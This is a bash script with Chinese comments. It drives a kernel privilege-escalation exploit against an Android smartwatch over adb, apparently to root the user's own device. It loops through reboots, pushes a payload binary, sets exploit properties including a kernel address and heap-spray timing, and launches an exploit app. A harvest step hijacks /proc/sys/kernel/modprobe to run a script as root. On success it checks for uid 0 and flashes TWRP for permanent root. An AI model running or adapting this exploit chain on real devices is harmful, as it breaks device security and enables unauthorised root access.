#!/bin/bash
# rc17_hunt_v2.sh [max_boots] —— 快速稳定版磨机（2026-09-25，基于 rc17_hunt.sh v20+D-C111）
#
# 相对原版的六项改进（依据 analysis_a\report.md 的台账复核，全部主机侧、不动 .so）：
#   V2-1  GATEONLY 默认 0（完整链）。原版第 180 行 `GATEONLY=${GATEONLY:-1}` 是个陷阱：
#         首轮监视阶段把变量钉成 1 之后，后续每轮 launch 都发 gateonly=1（只开窗不换 cred，
#         结构上不可能 uid0）。改回 0 后命中恢复正常。
#   V2-2  rc_live.txt 主机 logcat 命中通道常驻采集（原版只读不写——外部采集根本没跑；
#         命中后设备很快复位，设备侧文件来不及查，只有它能抓到）。
#   V2-3  完整链模式 NPOLL 6→30（90s→450s）：单窗可能 stall 数十秒、整链可能达数分钟；
#         轮次照旧在链打印终态标记或设备复位时提前收，所以长轮询只在链活着时花钱。
#   V2-4  devup 硬化：最多等 180s（原版 ~45s 放弃），60s 才动 kill-server——no-device 抖动
#         通常 30–60s 内自愈。
#   V2-5  uptime 门 80→60s（UPTIME_MIN 可覆盖）：每轮省 ~20s = +13% 轮/h，无已知副作用。
#   V2-6  冷启动检查点：每 COLD_EVERY=25 轮提示一次电池冷启动（ADSP 会话池/驱动
#         劣化的唯一已知出口），等设备离线再回线，最长 15 分钟，超时继续干磨。
#   V2-8  命中收尾自动刷维护 recovery：命中→App 刷 v7→复位→磨机走 recovery 通道刷入
#         TWRP v8 recovery→sysrq 重启。最终态 = v7 永久 root + TWRP，无需人工。
# 不动的部分：证据守卫（D-C110/D-C111 四通道）、幂等预置、payload 校验重推、单例锁、
# 命中即停保现场、launch 参数全套（rc=2 ntrig=0 trial0=0 phase=5 cand=7 sprayms=30）。
set -u
export MSYS_NO_PATHCONV=1
# 由 auto_root.sh 传入；独立运行时自动取唯一在线设备
if [ -z "${RC_SERIAL:-}" ]; then
  _d=$(adb devices 2>/dev/null | awk 'NR>1 && $2=="device"{print $1}')
  _n=$(printf "%s
" "$_d" | grep -c .)
  if [ "$_n" = 1 ]; then SER=$(printf "%s
" "$_d" | head -1)
  elif [ "$_n" -gt 1 ]; then echo "检测到多台设备，请用 RC_SERIAL 指定序列号" >&2; exit 4
  else echo "未发现在线设备" >&2; exit 4; fi
else
  SER="$RC_SERIAL"
fi
D="adb -s $SER"
MAXB=${1:-200}
SPRAYMS=${SPRAYMS:-30}
CONTEND=${CONTEND:-0}
BIGLEN=${BIGLEN:-2048}
GATEONLY=${GATEONLY:-0}          # V2-1: 完整链是默认；要开窗模式才显式给 1
NPOLL=${NPOLL:-30}               # V2-3: 30 x 15s = 450s 上限（提前收的条件不变）
UPTIME_MIN=${UPTIME_MIN:-60}     # V2-5
COLD_EVERY=${COLD_EVERY:-25}     # V2-6
DEVUP_MAX=${DEVUP_MAX:-180}      # V2-4
RECOVERY_AUTOFLASH=${RECOVERY_AUTOFLASH:-1}   # V2-8: 命中后自动刷入维护 recovery（TWRP v8）
# 主机侧可按检测到的固件版本覆盖（auto_root.sh 会 export 对应 A.89/A.92 的镜像名）
# v8：默认值由旧版换成实测通过的 v8 镜像（物理电源键可用 + 无自激）
REC_IMG="${REC_IMG:-twrp-3.7.0_9-ow20w3-recovery_v8_A92.img}"
HERE="$(cd "$(dirname "$0")" && pwd)"; cd "$HERE"
_singleton() {
  local pidf="$1" name="$2" old
  if [ -f "$pidf" ]; then
    old=$(cat "$pidf" 2>/dev/null)
    if [ -n "$old" ] && kill -0 "$old" 2>/dev/null; then
      echo "$(date +%H:%M:%S) another $name (pid $old) alive -> refusing to start" >> rc17_singleton.log
      exit 0
    fi
  fi
  echo $$ > "$pidf"
  trap "rm -f '$pidf'" EXIT
}
_singleton "$(cd "$(dirname "$0")" && pwd)/rc17_hunt.pid" "rc17_hunt_v2.sh"

LOG="rc17_log.txt"; LLOG="rc17_launch.log"; HB="rc17_heartbeat.txt"
say(){ printf '%s\n' "$*" | tee -a "$LOG"; }
S(){ timeout 30 $D shell "$1" 2>/dev/null | tr -d '\r'; }
# V2-7: /cache 证据的 mtime 新鲜度基线（设备侧时钟）。必须在 S() 定义之后取值。
DEV_T0=$(S 'date +%s' 2>/dev/null); [ -n "$DEV_T0" ] || DEV_T0=0
BID(){ S 'cat /proc/sys/kernel/random/boot_id'; }
PAN(){ S 'cat /proc/sys/kernel/panic_on_oops 2>&1' | tr -d ' '; }
DEVT(){ S 'date +"%m-%d %H:%M:%S.000"' 2>/dev/null; }

# startup_clean: 每次启动/重置都执行 —— 设备侧证据与日志 + 主机侧会话文件轮转归档。
# /cache/root_proof.txt 由 root 窗口写入、shell 清不掉: 守卫按 mtime 新鲜度判定(V2-7)。
startup_clean(){
  say "clean: device evidence/logs + host session files"
  S 'rm -f /data/local/tmp/zzq1.log' >/dev/null 2>&1
  S ': > /data/local/tmp/root_proof.txt' >/dev/null 2>&1
  S 'rm -f /cache/root_proof.txt' >/dev/null 2>&1
  S 'logcat -c' >/dev/null 2>&1
  [ -n "$(S 'test -s /cache/root_proof.txt && echo yes')" = "yes" ] && say "  note: /cache/root_proof.txt is root-owned; the guard uses mtime freshness (V2-7)"
  mkdir -p old_logs evidence
  ts=$(date +%Y%m%d_%H%M%S)
  for f in rc17_log.txt rc17_launch.log rc17_heartbeat.txt auto_root_hunt.log rc17_singleton.log; do
    [ -s "$f" ] && mv "$f" "old_logs/${f%.txt}_$ts.log" 2>/dev/null
  done
  for f in root_proof_2*.txt zzq1_log_2*.txt root_proof_cache_2*.txt proofkey_dmesg_*.txt; do
    [ -e "$f" ] && mv $f evidence/ 2>/dev/null
  done
  : > rc_live.txt
  say "clean done (old sessions in old_logs/, hit evidence in evidence/)"
}
# reset 模式: 只做清理后退出
if [ "${1:-}" = "reset" ]; then
  startup_clean
  exit 0
fi
# V2-4 devup：最多 DEVUP_MAX 秒；60s 未见设备才动 kill-server（其余时间纯等待自愈）
devup(){ local t0=$SECONDS dk=0
  while :; do
    timeout 10 $D get-state >/dev/null 2>&1 && return 0
    if [ "$dk" = 0 ] && [ $((SECONDS-t0)) -ge 60 ]; then
      timeout 15 adb kill-server >/dev/null 2>&1; timeout 15 adb start-server >/dev/null 2>&1; dk=1
    fi
    [ $((SECONDS-t0)) -ge "$DEVUP_MAX" ] && return 1
    sleep 5
  done; }
launch_rc(){ local t v
  t=0xc14e862c; v=0
  timeout 30 $D shell "setprop debug.p2.tgts '$t'; setprop debug.p2.vals '$v'; setprop debug.p2.tgt $t; setprop debug.p2.val $v; setprop debug.p2.ntrig 0; setprop debug.p2.trial0 0; setprop debug.p2.phase 5; setprop debug.p2.cand 7; setprop debug.p2.nolog 1; setprop debug.p2.sprayms $SPRAYMS; setprop debug.p2.contend $CONTEND; setprop debug.p2.biglen $BIGLEN; setprop debug.p2.refs 1; setprop debug.p2.flags 0x10; setprop debug.p2.handle 0; setprop debug.p2.rc 2; setprop debug.p2.gateonly $GATEONLY; am start -S -n com.gc.p2/.MainActivity" >/dev/null 2>&1
  devup || return 1
  return 0; }
lc_since(){ timeout 30 $D logcat -d -T "$1" -v time -s P2PROBE:V 2>/dev/null | grep -v "CONTEND" | tail -400; }
check_root(){ v=$(S 'grep -q ROOTED /data/local/tmp/zzq1.log 2>/dev/null && echo ROOTED; grep -q uid=0 /data/local/tmp/root_proof.txt 2>/dev/null && echo uid0; grep -q "setresuid(0,0,0) OK" /data/local/tmp/zzq1.log 2>/dev/null && echo setresuid0OK; grep -q BADCRED /data/local/tmp/zzq1.log 2>/dev/null && echo BADCRED; echo END'); }
evidence_guard(){ local ts p=0 z=0 c=0 k=0 km ct
  [ "$(S 'test -s /data/local/tmp/root_proof.txt && echo yes')" = "yes" ] && p=1
  [ "$(S 'grep -q ROOTED /data/local/tmp/zzq1.log 2>/dev/null && echo yes')" = "yes" ] && z=1
  ct=$(S 'stat -c %Y /cache/root_proof.txt 2>/dev/null' | tr -d ' ')
  if [ -n "$ct" ] && [ "$ct" -ge "$DEV_T0" ] 2>/dev/null; then c=1; fi
  km=$(S 'dmesg 2>/dev/null | grep -a PROOFKEY | tail -2')
  [ -n "$km" ] && k=1
  { [ "$p" = 1 ] || [ "$z" = 1 ] || [ "$c" = 1 ] || [ "$k" = 1 ]; } || return 1
  ts=$(date +%Y%m%d_%H%M%S)
  if [ "$p" = 1 ]; then
    timeout 60 $D pull /data/local/tmp/root_proof.txt "root_proof_${ts}.txt" >/dev/null 2>&1 \
      && say "D-C110: proof pulled to host -> root_proof_${ts}.txt" \
      || say "WARN: D-C110 proof pull failed (evidence stays on device)"
  fi
  if [ "$z" = 1 ]; then
    timeout 60 $D pull /data/local/tmp/zzq1.log "zzq1_log_${ts}.txt" >/dev/null 2>&1 \
      && say "D-C110: zzq1.log pulled to host -> zzq1_log_${ts}.txt" \
      || say "WARN: D-C110 zzq1.log pull failed (evidence stays on device)"
  fi
  if [ "$c" = 1 ]; then
    timeout 60 $D pull /cache/root_proof.txt "root_proof_cache_${ts}.txt" >/dev/null 2>&1 \
      && say "D-C111: /cache proof pulled to host -> root_proof_cache_${ts}.txt" \
      || say "WARN: D-C111 /cache pull failed (evidence stays on device)"
  fi
  if [ "$k" = 1 ]; then
    printf '%s\n' "$km" > "proofkey_dmesg_${ts}.txt"
    say "D-C111: PROOFKEY in dmesg -> proofkey_dmesg_${ts}.txt"
  fi
  return 0; }
push_payload(){ local i hm dm
  hm=$(md5sum zzq1 2>/dev/null | cut -d' ' -f1)
  for i in 1 2 3 4 5 6; do
    dm=$(S 'md5sum /data/local/tmp/x 2>/dev/null' | cut -d' ' -f1)
    [ "$hm" = "$dm" ] && { return 0; }
    timeout 40 $D push zzq1 /data/local/tmp/x >/dev/null 2>&1
    timeout 15 $D shell 'chmod 755 /data/local/tmp/x' >/dev/null 2>&1
    devup || sleep 5
  done
  return 1; }

# V2-8: 命中收尾——自动刷入维护 recovery（TWRP v8）。
# 为什么在命中之后而不是窗口内：一次命中窗口里 App 只能刷 boot（.so 的 flash_guarded 硬编码
# boot 分区），recovery 要等 v7 起来、主机拿到 uid0，再走 recovery 通道刷（flash_partition_
# from_recovery.sh 自带"进 recovery→推送校验→dd→整分区回读"），刷完 sysrq 重启。
# 最终态 = v7 永久 root + TWRP，全程无需人工。RECOVERY_AUTOFLASH=0 可关闭。
auto_flash_recovery(){ [ "$RECOVERY_AUTOFLASH" = 1 ] || return 0
  [ -f "$REC_IMG" ] || { say "skip recovery autoflash: $REC_IMG 缺失"; return 0; }
  say "=== 命中收尾：自动刷入维护 recovery（TWRP v8，回读校验）==="
  ST=$(S 'get-state')
  if [ "$ST" != "recovery" ]; then
    say "  设备当前在 $ST → 先重启进 recovery（约 20 秒）…"
    $D reboot recovery >/dev/null 2>&1
    okr=0
    for att in 1 2; do
      for i in $(seq 1 60); do sleep 3; [ "$(S 'get-state')" = "recovery" ] && { okr=1; break; }; done
      [ "$okr" = 1 ] && break
      [ "$att" = 1 ] && { say "  第一次等待未见到 recovery，再次发送重启命令…"; $D reboot recovery >/dev/null 2>&1; }
    done
    [ "$okr" = 1 ] && say "  ✓ 已进入 recovery" || { say "WARN: 未能进入 recovery —— 无损，可按 README《维护通道》手动重试。"; return 0; }
  fi
  if bash flash_partition_from_recovery.sh "$REC_IMG" recovery; then
    S 'echo b > /proc/sysrq-trigger' 2>/dev/null
    say "✓ recovery 已刷入并重启。最终态：v7 永久 root + TWRP（adb reboot recovery 进入）。"
  else
    say "WARN: recovery 刷写未确认成功 —— 设备仍在 v7，无损，可按 README《维护通道》手动重试。"
  fi; }

# ---- V2-2: 常驻主机 logcat 采集（命中主通道，D-C110）----
# 循环重连以跨越设备复位；写 rc_live.txt（append，跨 boot 连续，launch 用字节偏移切片）。
CAPTURE_PID_FILE="rc17_capture.pid"
stop_capture(){ [ -f "$CAPTURE_PID_FILE" ] && { kill "$(cat "$CAPTURE_PID_FILE")" 2>/dev/null; rm -f "$CAPTURE_PID_FILE"; }; }
start_capture(){
  stop_capture
  # 防孤儿：清掉上次异常退出的采集进程（Ctrl+C 强杀时 trap 不执行，会残留）
  powershell -NoProfile -Command "Get-CimInstance Win32_Process | Where-Object { \$_.CommandLine -match '[l]ogcat -v time' } | ForEach-Object { Stop-Process -Id \$_.ProcessId -Force -ErrorAction SilentlyContinue }" >/dev/null 2>&1
  ( while :; do timeout 3600 adb -s "$SER" logcat -v time >> rc_live.txt 2>/dev/null; sleep 2; done ) &
  echo $! > "$CAPTURE_PID_FILE"
}
trap 'stop_capture; rm -f rc17_hunt.pid' EXIT
trap 'stop_capture; rm -f rc17_hunt.pid; exit 130' INT TERM
startup_clean
start_capture

say "$(date +%H:%M:%S) RC17-v2-fast: GATEONLY=$GATEONLY NPOLL=$NPOLL UPTIME_MIN=$UPTIME_MIN COLD_EVERY=$COLD_EVERY DEVUP_MAX=$DEVUP_MAX recovery=$RECOVERY_AUTOFLASH capture=on"
echo "$(date +%H:%M:%S) start v2-fast" >> "$HB"
push_payload || say "WARN: /data/local/tmp/x push failed (rc_child execs that path)"
timeout 20 $D push mod.sh /data/local/tmp/mod.sh >/dev/null 2>&1
timeout 15 $D shell 'chmod 755 /data/local/tmp/mod.sh' >/dev/null 2>&1
timeout 15 $D shell 'p=/data/local/tmp/root_proof.txt; z=/data/local/tmp/zzq1.log; test -s $p || touch $p; test -s $z || touch $z; chmod 666 $p $z' >/dev/null 2>&1
harvest(){ timeout 20 $D shell 'printf "%s" /data/local/tmp/mod.sh > /proc/sys/kernel/modprobe 2>/dev/null && echo MODPROBE-ARMED && printf "Þ­¾ï" > /data/local/tmp/t && chmod 755 /data/local/tmp/t && (/data/local/tmp/t >/dev/null 2>&1; true)' 2>/dev/null | tr -d '
'; }


for boot in $(seq 1 "$MAXB"); do
  say ""; say "##### RC17 BOOT $boot/$MAXB $(date +%H:%M:%S) #####"; echo "$(date +%H:%M:%S) boot$boot" >> "$HB"
  devup || { say "no-device"; sleep 10; continue; }
  if evidence_guard; then
    say "*** hit evidence (proof/zzq1.log/kmsg//cache) BEFORE boot reboot -> STOPPING (preserving scene) ***"
    S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; tail -10 /data/local/tmp/zzq1.log 2>/dev/null; echo ---; cat /cache/root_proof.txt 2>/dev/null; echo ---; dmesg 2>/dev/null | grep -a PROOFKEY | tail -3; echo ---; getenforce'
    auto_flash_recovery
    exit 0
  fi
  timeout 20 $D reboot >/dev/null 2>&1; sleep 14; timeout 60 $D wait-for-device >/dev/null 2>&1
  for i in $(seq 1 40); do [ "$(S 'getprop sys.boot_completed')" = "1" ] && break; sleep 3; done
  while :; do up=$(S 'cut -d. -f1 /proc/uptime'); [ "${up:-0}" -ge "$UPTIME_MIN" ] && break; sleep 4; done
  b0id=$(BID)
  if evidence_guard; then
    say "*** hit evidence at boot start -> STOPPING (preserving scene) ***"
    S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; tail -10 /data/local/tmp/zzq1.log 2>/dev/null; echo ---; cat /cache/root_proof.txt 2>/dev/null; echo ---; dmesg 2>/dev/null | grep -a PROOFKEY | tail -3; echo ---; getenforce'
    auto_flash_recovery
    exit 0
  fi
  timeout 15 $D shell 'rm -f /data/local/tmp/zzq1.log /data/local/tmp/x.log' >/dev/null 2>&1
  timeout 15 $D shell 'p=/data/local/tmp/root_proof.txt; z=/data/local/tmp/zzq1.log; test -s $p || touch $p; test -s $z || touch $z; chmod 666 $p $z' >/dev/null 2>&1
  if evidence_guard; then
    say "*** hit evidence just before launch -> STOPPING (preserving scene) ***"
    S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; getenforce'
    auto_flash_recovery
    exit 0
  fi
  say "boot=${b0id:0:8} up=$(S 'cut -d. -f1 /proc/uptime') panic=$(PAN)"
  push_payload

  LT0=$(wc -c < rc_live.txt 2>/dev/null || echo 0)
  T0=$(DEVT)
  launch_rc || { say "device lost in launch_rc"; continue; }
  say "launched (rc=$(S 'getprop debug.p2.rc') ntrig=$(S 'getprop debug.p2.ntrig') gateonly=$GATEONLY spray=$SPRAYMS) at $(date +%H:%M:%S); polling (max $((NPOLL*15))s)"
  for w in $(seq 1 $NPOLL); do sleep 15; check_root; case "$v" in *ROOTED*|*uid0*) break;; esac
    if evidence_guard; then
      echo "$(date +%H:%M:%S) *** UID0 ACHIEVED (device evidence mid-poll) ***" >> "$HB"
      break
    fi
    harvest >/dev/null 2>&1
    bn2=$(BID); [ "${bn2:0:8}" != "${b0id:0:8}" ] && { echo "$(date +%H:%M:%S) reset during poll" >> "$HB" 2>/dev/null; break; }
    lt=$(tail -c +"$((LT0+1))" rc_live.txt 2>/dev/null | grep -ac "RC2: done without uid=0\|no identity-proven tail task\|never landed this boot\|CHAIN SUCCESS\|ADSP wedged\|RC CHILD ROOTED\|sleeping forever\|keeping EVERYTHING open")
    [ "${lt:-0}" != "0" ] && break
  done
  lc=$(lc_since "$T0" | grep -E "RC2|RC window|comm seen|carrier|VERIFIED|swap round|CHAIN SUCCESS|RC CHILD|selinux|enforce|tailV|exhausted|TRIGGER: MUNMAP|VERDICT|DEAD fl|SKIP|no reclaim|spray: [0-9]+ x|ARMED|readback|enospc" | tail -14 | tr '\n' '|')
  check_root
  hlt=$(tail -c +"$((LT0+1))" rc_live.txt 2>/dev/null | grep -a "RC CHILD ROOTED\|CHAIN SUCCESS\|RC kmsg: PROOFKEY.*euid=0" | tail -3 | tr '\n' '|')
  say "RC17-v2 result [$v]"
  say "   app=[$lc] hit_logcat=[$hlt] getenforce=[$(S getenforce)] panic=[$(PAN)]"
  { printf '\n--- IN-APP CHAIN %s ---\n%s\n' "$(date +%H:%M:%S)" "$lc" >> "$LLOG"; }
  case "$v" in *ROOTED*|*uid0*|*xuid0*)
    say "*** UID0 ACHIEVED (in-app chain) ***"
    evidence_guard
    S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; tail -10 /data/local/tmp/zzq1.log 2>/dev/null; echo ---; cat /cache/root_proof.txt 2>/dev/null; echo ---; dmesg 2>/dev/null | grep -a PROOFKEY | tail -3; echo ---; getenforce'
    auto_flash_recovery
    exit 0;;
  esac
  if [ -n "$hlt" ]; then
    say "*** UID0 ACHIEVED (host logcat evidence: $hlt) ***"
    evidence_guard
    S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; tail -10 /data/local/tmp/zzq1.log 2>/dev/null; echo ---; cat /cache/root_proof.txt 2>/dev/null; echo ---; dmesg 2>/dev/null | grep -a PROOFKEY | tail -3; echo ---; getenforce'
    auto_flash_recovery
    exit 0
  fi
  bn=$(BID); [ "$bn" != "$b0id" ] && say "reset during the chain"
  say "boot done without root"
  # V2-6: 冷启动检查点——每 COLD_EVERY 轮提示电池冷启动（会话池/驱动劣化的唯一被证实出口）
  if [ $((boot % COLD_EVERY)) = 0 ] && [ "$boot" -lt "$MAXB" ]; then
    say "##### COLD-BOOT CHECKPOINT (boot $boot) #####"
    say "  请给手表一次电池冷启动：拔 USB（可选）→ 长按侧键 12 秒关机 → 再开机 → 插回 USB"
    say "  我会等它离线再回线（最长 15 分钟），期间磨机挂起；不操作则 15 分钟后自动继续干磨。"
    offline_seen=0; t0=$SECONDS
    while [ $((SECONDS-t0)) -lt 900 ]; do
      timeout 10 $D get-state >/dev/null 2>&1 || { offline_seen=1; break; }
      sleep 5
    done
    if [ "$offline_seen" = 1 ]; then
      say "  设备已离线，等它冷启动回来（最长 10 分钟）..."
      t0=$SECONDS
      while [ $((SECONDS-t0)) -lt 600 ]; do
        timeout 10 $D get-state >/dev/null 2>&1 && { say "  ✓ 设备回线"; break; }
        sleep 5
      done
      for i in $(seq 1 40); do [ "$(S 'getprop sys.boot_completed')" = "1" ] && break; sleep 3; done
    else
      say "  15 分钟未见离线 —— 跳过本次冷启动，继续干磨。"
    fi
  fi
done
say "RC17-v2 exhausted $MAXB boots without uid0"
